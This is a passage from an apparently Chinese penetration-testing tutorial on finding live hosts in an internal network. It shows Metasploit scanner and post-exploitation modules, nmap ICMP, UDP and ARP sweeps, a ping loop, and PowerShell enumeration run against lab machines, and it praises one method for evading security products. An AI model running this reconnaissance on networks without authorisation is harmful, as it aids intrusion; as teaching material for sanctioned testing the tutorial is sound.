<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.101</span> JOHN‐PC Windows <span class="token number">7</span> Ultimate SP1 client
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.103</span> LAPTOP‐<span class="token number">9994</span>K8RP Windows <span class="token number">10</span> client
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span>af<span class="token punctuation">:</span>ce<span class="token punctuation">:</span>cc VM_2003X86 Windows <span class="token number">2003</span> SP2 server
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.116</span> WIN‐S4H51RDJQ3M Windows <span class="token number">2012</span> server
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">85</span><span class="token punctuation">:</span>d6<span class="token punctuation">:</span><span class="token number">7</span>d WIN03X64 Windows <span class="token number">2003</span> SP2 server
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.254</span> Unknown device
<span class="token number">192.168</span><span class="token number">.50</span><span class="token number">.30</span> WINDOWS‐G4MMTV8 Windows <span class="token number">7</span> SP1 client
<span class="token number">192.168</span><span class="token number">.100</span><span class="token number">.2</span> Unknown device
<span class="token number">192.168</span><span class="token number">.100</span><span class="token number">.10</span>
</code></pre>
<p>同样hosts命令也支持数据库中查询与搜索，方便快速对应目标存活主机</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> hosts ‐h
Usage<span class="token punctuation">:</span> hosts <span class="token punctuation">[</span> options <span class="token punctuation">]</span> <span class="token punctuation">[</span>addr1 addr2 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span> 

OPTIONS<span class="token punctuation">:</span>
‐a<span class="token punctuation">,</span>‐‐add Add the hosts instead of searching
‐d<span class="token punctuation">,</span>‐‐delete Delete the hosts instead of searching
‐c <span class="token operator">&lt;</span>col1<span class="token punctuation">,</span>col2<span class="token operator">&gt;</span> Only show the given columns <span class="token punctuation">(</span>see list below<span class="token punctuation">)</span>
‐C <span class="token operator">&lt;</span>col1<span class="token punctuation">,</span>col2<span class="token operator">&gt;</span> Only show the given columns until the next restart <span class="token punctuation">(</span>see list below<span class="token punctuation">)</span>
‐h<span class="token punctuation">,</span>‐‐help Show this help information
‐u<span class="token punctuation">,</span>‐‐up Only show hosts which are up
‐o <span class="token operator">&lt;</span>file<span class="token operator">&gt;</span> Send output to a file in csv format
‐O <span class="token operator">&lt;</span>column<span class="token operator">&gt;</span> Order rows by specified column number
‐R<span class="token punctuation">,</span>‐‐rhosts Set RHOSTS from the results of the search
‐S<span class="token punctuation">,</span>‐‐search Search string to filter by
‐i<span class="token punctuation">,</span>‐‐info Change the info of a host
‐n<span class="token punctuation">,</span>‐‐name Change the name of a host
‐m<span class="token punctuation">,</span>‐‐comment Change the comment of a host
‐t<span class="token punctuation">,</span>‐‐tag Add or specify a tag to a range of hosts
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224613737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> hosts ‐S <span class="token number">192</span> 

Hosts
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 

address mac name os_name os_flavor os_sp purpose info comments
‐‐‐‐‐‐‐ ‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> JOHN‐PC Windows <span class="token number">7</span> SP1 client
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.101</span> JOHN‐PC Windows <span class="token number">7</span> Ultimate SP1 client
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.103</span> LAPTOP‐<span class="token number">9994</span>K8RP Windows <span class="token number">10</span> client
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span>af<span class="token punctuation">:</span>ce<span class="token punctuation">:</span>cc VM_2003X86 Windows <span class="token number">2003</span> SP2 server
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.116</span> WIN‐S4H51RDJQ3M Windows <span class="token number">2012</span> server
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">85</span><span class="token punctuation">:</span>d6<span class="token punctuation">:</span><span class="token number">7</span>d WIN03X64 Windows <span class="token number">2003</span> SP2 server
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.254</span> Unknown device
<span class="token number">192.168</span><span class="token number">.50</span><span class="token number">.30</span> WINDOWS‐G4MMTV8 Windows <span class="token number">7</span> SP1 client
<span class="token number">192.168</span><span class="token number">.100</span><span class="token number">.2</span> Unknown device
<span class="token number">192.168</span><span class="token number">.100</span><span class="token number">.10</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224626155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">30</span><span class="token operator">/</span><span class="token number">27</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>msf<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji<span class="token operator">-</span>di<span class="token operator">-</span>wu<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="546_MSF6_2712"></a>5.4.6 基于MSF发现内网存活主机（6）</h2>
<p>攻击机：<br>
192.168.1.102 Debian</p>
<p>靶机：<br>
192.168.1.2 Windows 7<br>
192.168.1.115 Windows 2003<br>
192.168.1.119 Windows 2003</p>
<p>（1）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version
</code></pre>
<p>（2）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version
</code></pre>
<p>（3）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ack
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>tcp
</code></pre>
<p>（4）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>syn 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ftpbounce
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>xmas 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>rdp_scanner
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smtp<span class="token operator">/</span>smtp_version
</code></pre>
<p>（5）主要介绍scanner下的三个模块，以及db_nmap辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>pop3<span class="token operator">/</span>pop3_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>postgres<span class="token operator">/</span>postgres_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>anonymous
db_nmap
</code></pre>
<p>（6）主要介绍post下的六个模块，辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">windows<span class="token operator">/</span>gather<span class="token operator">/</span>arp_scanner 
windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_ad_computers
windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_computers 
windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_domain
windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_domains 
windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_ad_user_comments
</code></pre>
<p>在实战过程中，许多特殊环境下scanner，db_nmap不能快速符合实战渗透诉求，尤其在域中的主机存活发现，而post下的模块，弥补了该诉求，以便快速了解域中存活主机</p>
<p><strong>25、基于windows/gather/arp_scanner发现内网存活主机</strong></p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> run windows<span class="token operator">/</span>gather<span class="token operator">/</span>arp_scanner RHOSTS<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.110</span>‐<span class="token number">120</span> THREADS<span class="token operator">=</span><span class="token number">20</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Running module against VM_2003X86
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ARP Scanning <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.110</span>‐<span class="token number">120</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> IP<span class="token punctuation">:</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span> MAC <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span>af<span class="token punctuation">:</span>ce<span class="token punctuation">:</span>cc <span class="token punctuation">(</span>VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> IP<span class="token punctuation">:</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> MAC <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">85</span><span class="token punctuation">:</span>d6<span class="token punctuation">:</span><span class="token number">7</span>d <span class="token punctuation">(</span>VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224822827.png#pic_center" alt="在这里插入图片描述"><br>
<strong>26、基于windows/gather/enum_ad_computers发现域中存活主机</strong></p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> run windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_ad_computers
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224846697.png#pic_center" alt="在这里插入图片描述"><br>
<strong>27、基于windows/gather/enum_computers发现域中存活主机</strong></p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> run windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_computers 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Running module against VM_2003X86
<span class="token punctuation">[</span>‐<span class="token punctuation">]</span> This host is not part of a domain<span class="token punctuation">.</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224909110.png#pic_center" alt="在这里插入图片描述"><br>
<strong>28、基于windows/gather/enum_domain发现域中存活主机</strong></p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> run windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_domain
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224932581.png#pic_center" alt="在这里插入图片描述"><br>
<strong>29、基于windows/gather/enum_domains 发现域中存活主机</strong></p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> run windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_domains 
​
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Enumerating DCs <span class="token keyword">for</span> WORKGROUP
<span class="token punctuation">[</span>‐<span class="token punctuation">]</span> No Domain Controllers found<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224956173.png#pic_center" alt="在这里插入图片描述"><br>
<strong>30、基于windows/gather/enum_ad_user_comments发现域中存活主机</strong></p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> run windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_ad_user_comments
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002225021805.png#pic_center" alt="在这里插入图片描述"><br>
POST下相关模块如：（列举）不一一介绍</p>
<pre><code class="prism language-c">linux<span class="token operator">/</span>gather<span class="token operator">/</span>enum_network
linux<span class="token operator">/</span>busybox<span class="token operator">/</span>enum_hosts
windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_ad_users
windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_domain_tokens
windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_snmp
</code></pre>
<p>至此，MSF发现内网存活主机主要模块介绍与使用完毕…</p>
<p>感谢Micro8大佬！！！</p>
<p>参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">30</span><span class="token operator">/</span><span class="token number">28</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>msf<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji<span class="token operator">-</span>di<span class="token operator">-</span>liu<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="547_sqlDataSourceEnumerator_2851"></a>5.4.7 基于sqlDataSourceEnumerator发现内网存活主机</h2>
<p><strong>连载1</strong></p>
<p>System.Data.SqlClient 命名空间是用于 SQL Server 的 .NET 数据提供程序。在net framework2.0中新增加SqlDataSourceEnumerator 类。提供了一种枚举本地网络内的所有可用 SQL Server 实例机制。微软官方是这样解释的：</p>
<p>SQL Server 2000 和 SQL Server 2005 进行应用程序可以确定在当前网络中的 SQL Server实例存在。SqlDataSourceEnumerator类公开给应用程序开发人员，提供此信息DataTable包含所有可用的服务器的信息。返回此表列出了与列表匹配提供当用户尝试创建新的连接的服务器实例以及Connection Properties对话框中，展开下拉列表，其中包含所有可用的服务器</p>
<pre><code class="prism language-c">PowerShell <span class="token operator">-</span>Command 
<span class="token string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002225332987.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201002225339103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
此种方法，在实战中，不留文件痕迹。并且信息准确，发现主机也可。可应对目前主流安全防御产品!!</p>
<p>参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">41</span><span class="token operator">-</span><span class="token number">50</span><span class="token operator">/</span><span class="token number">50</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>sqldatasourceenumerator<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji
</code></pre>
<p>感谢大佬！！Micro8</p>
<hr>
<h2><a id="548_ICMPdayuSeventeenth_Day_2874"></a>5.4.8 基于ICMP发现内网存活主机（dayu-Seventeenth Day）</h2>
<p><strong>ICMP简介：</strong></p>
<p>它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>
<p><strong>nmap扫描：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># nmap ‐sP ‐PI <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> ‐T4
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003081019711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># nmap ‐sn ‐PE ‐T4 <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003081036294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>CMD下扫描：</strong></p>
<pre><code class="prism language-c"><span class="token keyword">for</span> <span class="token operator">/</span>L <span class="token operator">%</span>P in <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">254</span><span class="token punctuation">)</span> DO @ping ‐w <span class="token number">1</span> ‐n <span class="token number">1</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>P <span class="token operator">|</span> findstr <span class="token string">"TTL ="</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003081053682.png#pic_center" alt="在这里插入图片描述"><br>
<strong>powershell扫描：</strong></p>
<pre><code class="prism language-c">powershell<span class="token punctuation">.</span>exe ‐exec bypass ‐Command "Import‐Module <span class="token punctuation">.</span><span class="token operator">/</span>Invoke‐TSPingSweep<span class="token punctuation">.</span>ps1
<span class="token punctuation">;</span> Invoke‐TSPingSweep ‐StartAddress <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> ‐EndAddress <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.254</span> ‐Resolv
eHost ‐ScanPort ‐Port <span class="token number">445</span><span class="token punctuation">,</span><span class="token number">135</span>"
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003081112377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201003081117140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">D<span class="token punctuation">:</span>\<span class="token operator">&gt;</span>tcping<span class="token punctuation">.</span>exe ‐n <span class="token number">1</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token number">80</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003081130568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">30</span><span class="token operator">/</span><span class="token number">21</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>icmp<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="549_UDP_2918"></a>5.4.9 基于UDP发现内网存活主机</h2>
<p><strong>UDP简介：</strong></p>
<p>UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p>
<p><strong>UDP显著特性：</strong></p>
<p>1）UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次。</p>
<p>2）UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任何（协议上的）记录边界。</p>
<p>3）UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报</p>
<p>4）UDP 支持多播和广播。</p>
<p><strong>1、nmap扫描</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># nmap <span class="token operator">-</span>sU <span class="token operator">-</span>T5 <span class="token operator">-</span>sV <span class="token operator">--</span>max<span class="token operator">-</span>retries <span class="token number">1</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span> <span class="token operator">-</span>p <span class="token number">500</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003081619304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>2、msf扫描</strong></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003081646829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100308165936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>3、unicornscan扫描</strong></p>
<p>linux下使用推荐</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># unicornscan <span class="token operator">-</span>mU <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003081726995.png#pic_center" alt="在这里插入图片描述"><br>
项目地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>mcafee<span class="token punctuation">.</span>com<span class="token operator">/</span>ca<span class="token operator">/</span>downloads<span class="token operator">/</span>free<span class="token operator">-</span>tools<span class="token operator">/</span>scanline<span class="token punctuation">.</span>aspx
</code></pre>
<p>蓝奏地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>lanzous<span class="token punctuation">.</span>com<span class="token operator">/</span>i32zncf
</code></pre>
<p>win下使用推荐。管理员执行<br>
<img src="https://img-blog.csdnimg.cn/20201003082234157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201003082240429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
附录：<br>
在线基于Nmap的udp扫描：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>pentest<span class="token operator">-</span>tools<span class="token punctuation">.</span>com<span class="token operator">/</span>network<span class="token operator">-</span>vulnerability<span class="token operator">-</span>scanning<span class="token operator">/</span>udp<span class="token operator">-</span>port<span class="token operator">-</span>scanner<span class="token operator">-</span>online<span class="token operator">-</span>nmap​
</code></pre>
<p>–By Micropoor</p>
<p>参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">20</span><span class="token operator">/</span><span class="token number">12</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>udp<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="5410_ARP_2988"></a>5.4.10 基于ARP发现内网存活主机</h2>
<p><strong>ARP简介：</strong></p>
<p>ARP，通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p>
<p><strong>1、nmap扫描</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># nmap <span class="token operator">-</span>sn <span class="token operator">-</span>PR <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token operator">/</span><span class="token number">24</span>
</code></pre>
